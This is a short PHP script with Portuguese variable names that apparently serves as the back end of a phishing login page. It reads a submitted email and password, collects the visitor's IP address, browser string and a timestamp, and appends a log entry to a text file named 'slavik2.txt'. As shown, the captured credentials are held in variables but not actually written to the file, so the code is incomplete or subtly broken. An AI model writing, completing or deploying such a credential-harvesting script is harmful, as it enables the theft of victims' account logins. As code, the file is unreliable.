<?php
if (!empty($_POST) AND (empty($_POST['email']) OR empty($_POST['pass']))) {
      header("Location: index.php"); exit;
  }

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }
$LOGIN = $_POST ['email'];
$SENHA = $_POST ['pass'];
$datahora = date('d/m/Y \à\s H:i:s');


$brow=" BROWSER  :";
$browser = $_SERVER['HTTP_USER_AGENT'];


$CONTEUDO =  "\n---------------------------------------
| ACESS ON MY COMPUTER | $datahora 

";
$ARQUIVO = "slavik2.txt" ;  
$ABRIR = fopen ($ARQUIVO, "a") ;
fwrite ($ABRIR, $CONTEUDO) ;
fclose ($ABRIR) ;  


?>
